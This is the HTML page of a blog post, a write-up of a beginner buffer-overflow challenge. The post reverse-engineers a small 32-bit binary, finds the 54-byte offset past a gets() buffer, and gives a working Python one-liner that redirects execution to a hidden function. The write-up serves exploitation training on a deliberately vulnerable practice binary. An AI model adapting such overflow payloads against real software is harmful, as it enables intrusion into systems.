@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>7h3rAm's Infosec Ramblings</title>
+    <meta charset="utf-8"/>
+    <meta content="7h3rAm" name="author"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <script src="/static/js/jquery/jquery-1.10.2.js"></script>
+    <link href="/static/css/bootstrap/bootstrap.3.3.6.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/morrisjs/morris.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/timeline/timeline.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/main.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
+    <link href="/static/images/favicon.ico" rel="icon" type="image/x-icon"/>
+
+    <!-- Google Analytics -->
+    <script>
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-50288765-1', '7h3rAm.github.io');
+    ga('send', 'pageview');
+    </script>
+    <script async src='http://www.google-analytics.com/analytics.js'></script>
+    <!-- End Google Analytics -->
+
+  </head>
+  <body id="index" class="home">
+    <header class="header">
+      <nav>
+        <ul>
+          <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+          <li><a href="/archive.html"><i class="fa fa-archive"></i> Archive</a></li>
+          <li><a href="/tags.html"><i class="fa fa-tags"></i> Tags</a></li>
+          <li><a href="/dashboard.html"><i class="fa fa-bar-chart"></i> Dashboard</a></li>
+          <li><a href="/research.html"><i class="fa fa-list-alt"></i> Research</a></li>
+        </ul>
+      </nav>
+    </header>
+    <section id="content" class="body">
+      
+  
+  
+  <article class="post">
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          buf0 - A Buffer Overflow Challenge
+        </div>
+        <div class="panel-body">
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              
+                <p class="post-date">
+                  <a href="/2013/regex-to-dotgraph.html"><i class="fa fa-angle-double-left"></i></a> published on January 6, 2014<a href="/2014/buf1-challenge.html"> <i class="fa fa-angle-double-right"></i></a><br/>
+                  readtime: 4 minutes and 8 seconds (view <a href="https://raw.githubusercontent.io/7h3rAm/7h3rAm.github.io/master/_posts/buf0-challenge.md">source</a>)
+                </p>
+              
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+        <div class="post-summary">This is a buffer overflow challenge I found online. Although some people might find this to be a pretty easy exploit target, I thought of posting a writeup since it will still be someone's starting point into the jouney of exploitation.</div>
+        <div class="post-content">
+          <p>The binary can be obtained from here: <a href="/files/buf0.bin">buf0</a>. Let&#8217;s see
+what <code>file</code> command has to tell us about this challenge file:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span>file buf0.bin
+buf0.bin: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0x3a0cbf6e6af7d4a5d1294f2ce18e80ad3e778d48, not stripped
+</code></pre></div>
+
+<p>So, this is an x86 ELF binary with symbols included. Let&#8217;s run <code>strings</code>
+as well over this file:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span>strings buf0.bin
+/lib/ld-linux.so.2
+j,O<span class="o">)</span>
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+gets
+puts
+__libc_start_main
+GLIBC_2.0
+PTRh
+UWVS
+<span class="o">[</span>^_<span class="o">]</span>
+W00T!
+<span class="p">;</span>*2<span class="nv">$&quot;</span>
+</code></pre></div>
+
+<p>This is interesting. The binary is using <code>gets</code> syscall which is
+commonly exploited against buffer overflow vulnerabilities. There is a
+<code>W00T!</code> string as well which indicates that we need to exploit the
+binary and get this string printed. Before we execute this file, let&#8217;s
+do some static analysis on it using IDA:</p>
+
+<p><img src="/static/files/ida-start.png" alt="image" /></p>
+
+<p>Apart from the standard libc defintions and <code>main</code>, I see an interesting
+function called <code>returnToMe</code> at location 0x08048404. Let&#8217;s follow this
+function and see what is it doing:</p>
+
+<p><img src="/static/files/ida-returntome.png" alt="image" /></p>
+
+<p>Like I mentioned earlier, this is where the <code>W00T!</code> string is printed
+and as per the assumption, we need to leverage the overflow in a way
+that this function is called. Let&#8217;s now run the binary and see how it
+behaves:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span>./buf0.bin
+AAAAAAAAAAA
+<span class="err">$</span>
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10&#39;</span> <span class="p">|</span> ./buf0.bin
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*30&#39;</span> <span class="p">|</span> ./buf0.bin
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*50&#39;</span> <span class="p">|</span> ./buf0.bin
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*60&#39;</span> <span class="p">|</span> ./buf0.bin
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+<span class="err">$</span>
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*55&#39;</span> <span class="p">|</span> ./buf0.bin
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*53&#39;</span> <span class="p">|</span> ./buf0.bin
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*54&#39;</span> <span class="p">|</span> ./buf0.bin
+<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*55&#39;</span> <span class="p">|</span> ./buf0.bin
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</code></pre></div>
+
+<p>So, the binary accepts input through the <code>gets</code> syscall and is as such
+vulnerable to a classic stack-based buffer overflow. We do some
+trial-and-error to figure out the size of the buffer and it turns out to
+be 54B after which any extra byte would corrupt the stack metadata
+resulting in a <code>Segmentation fault (core dumped)</code> error. So, these 54B
+comprise of the following stack variables:</p>
+
+<div class="codehilite"><pre><code>50B <span class="o">(</span>buf<span class="o">)</span> + 4B <span class="o">(</span>saved EBP<span class="o">)</span>
+</code></pre></div>
+
+<p>The next 4B following saved EBP is the saved return address, EIP, and
+this is what we need to overwrite to achieve successful exploitation.
+For this challenge, the author wants us to overwrite EIP with the
+address of the <code>returnToMe</code> function but there are others ways of
+exploiting this as well:</p>
+
+<ol>
+<li>Injecting a 54B or less shellcode in the buffer and overwriting EIP
+with the start of the shellcode/NOP sled</li>
+<li>Injecting a bigger shellcode through an environment variable and
+overwriting EIP with it&#8217;s address</li>
+</ol>
+
+<p>But to keep things simple, let&#8217;s just focus on how to complete the
+challenge by satisfying author&#8217;s criteria. To know how to exploit such
+challenges using above steps please read my earlier post <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming
+Up on Stack #1 - Solutions</a>
+and it&#8217;s subsequent parts.</p>
+
+<p>From the IDA screenshot above it is already known that the <code>returnToMe</code>
+function is at location 0x08048404. Let&#8217;s exploit the binary with a
+random payload of 54B concatenated with this new return address:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*54 + &quot;\x04\x84\x04\x08&quot;&#39;</span> <span class="p">|</span> ./buf0.bin
+W00T!
+</code></pre></div>
+
+<p>Awesome! We get the required string printed, thus completing this
+challenge. Stay tuned for a post on a similar challenge.</p>
+
+        </div>
+        <div class="post-bottomline">
+          <hr/>
+          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-twitter"></i></a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank"><i class="fa fa-exclamation-circle"></i> issue</a> on blog reporsitory.</p>
+          <hr/>
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              <table>
+                <tr>
+                  <td align="left">(share via <a href="mailto:?subject=buf0 - A Buffer Overflow Challenge&body=/2014/buf0-challenge.html" target="_blank" title="Share via Email"><i class="fa fa-inbox"></i></a> <a href="http://twitter.com/intent/tweet?text=buf0 - A Buffer Overflow Challenge+/2014/buf0-challenge.html&via=7h3rAm" target="_blank" title="Share on Twitter"><i class="fa fa-twitter"></i></a> <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=/2014/buf0-challenge.html&p[images][0]=&p[title]=buf0 - A Buffer Overflow Challenge&p[summary]=This is a buffer overflow challenge I found online. Although some people might find this to be a pretty easy exploit target, I thought of posting a writeup since it will still be someone's starting point into the jouney of exploitation." target="_blank" title="Share on Facebook"><i class="fa fa-facebook"></i></a> <a href="https://plus.google.com/share?url=/2014/buf0-challenge.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus"></i></a>)</td>
+                  <td align="right">(tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a>, <a href=/tags.html#writeups>writeups</a> and <a href=/tags.html#reversing>reversing</a>)</td>
+                </tr>
+                <tr>
+                  
+                    <td align="left"><a href="/2013/regex-to-dotgraph.html"><i class="fa fa-angle-double-left"></i> Visualizing (non-POSIX) Regular Expressions <i class="fa fa-angle-double-left"></i></a></td>
+                    <td align="right"><a href="/2014/buf1-challenge.html"><i class="fa fa-angle-double-right"></i> buf1 - Another Buffer Overflow Challenge <i class="fa fa-angle-double-right"></i></a></td>
+                  
+                </tr>
+              </table>
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          Related Posts
+        </div>
+        <div class="panel-body">
+          
+            1. <a href="/2013/malsoftware-reverse-challenge.html">reverse Challenge from Coursera's Malicious Software Course</a>
+            <div class="overview-date">August 29, 2013</div>
+            <br/>
+          
+            2. <a href="/2013/geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 - Solutions</a>
+            <div class="overview-date">January 3, 2013</div>
+            <br/>
+          
+            3. <a href="/2014/little-pdf.html">Little PDF Puzzle from Didier Stevens</a>
+            <div class="overview-date">September 18, 2014</div>
+            <br/>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </article>
+
+    </section>
+    <footer class="footer">
+      <b><a href="/">Ankur Tyagi</a></b> (<b><a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-at"></i>7h3rAm</a></b>)
+      <br/>
+      Last updated on October 20, 2016 (<b><a href="/rss.xml"><i class="fa fa-rss"></i> rss</a></b> <b><a href="/sitemap.xml"><i class="fa fa-sitemap"></i> sitemap</a></b>)
+      <br/>
+      Published under <b><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">by-nc-sa</a></b> and powered by <b><a alt="Linux" href="https://www.kernel.org/" target="_blank"><i class="fa fa-linux"></i></a></b>, <b><a alt="Kalpi" href="https://github.com/7h3rAm/kalpi/" target="_blank">kalpi</a></b>, <b><a href="http://git-scm.com/" target="_blank"><i class="fa fa-git"></i></a></b> and <b><a href="https://github.com/7h3rAm/7h3ram.github.io" target="_blank"><i class="fa fa-github"></i></a></b>
+    </footer>
+
+    <script src="/static/js/bootstrap/bootstrap.3.3.6.min.js"></script>
+    <script src="/static/js/raphael/raphael-min.js"></script>
+    <script src="/static/js/morrisjs/morris.min.js"></script>
+    <script src="/static/files/chart-data.js"></script>
+    <script src="/static/js/sprintf/sprintf.js"></script>
+    <script src="/static/js/underscore/underscore-min.js"></script>
+
+  </body>
+</html>
